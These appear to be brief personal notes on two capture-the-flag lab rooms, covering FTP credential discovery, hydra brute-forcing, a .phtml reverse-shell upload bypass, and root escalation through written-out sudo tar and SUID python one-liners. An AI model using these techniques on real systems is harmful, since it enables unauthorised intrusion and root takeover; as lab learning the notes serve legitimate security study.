

### Cowboy Hacker...
did an nmap found ftp and ssh
ftp got us 2 .txt's
info on user and list of passwords
used hydra to brute with that user + passwords got a shell
then privesc with only thing our user could run as root... with this GTFObin

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

![[Pasted image 20240108213209.png]]


![[Pasted image 20240108213119.png]]
![[Pasted image 20240108213325.png]]

root!


### RootMe

nmap + dirb/gobuster to discover file upload
upload php revshell that's saved as .phtml (it doesnt accept php)
go to ip/uploads and get directory listings
run the phtml from there
catch the shell with nc

![[Pasted image 20240109152431.png]]


![[Pasted image 20240109152443.png]]

we try to find something to privesc with
`find / -perm -u=s -type f 2>/dev/null`

![[Pasted image 20240109153728.png]]

gtfobins search suid python...

`/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`



![[Pasted image 20240109153921.png]]



`find / -type f -name root.txt 2>/dev/null`

``
![[Pasted image 20240109154041.png]]

root flag and root shell...



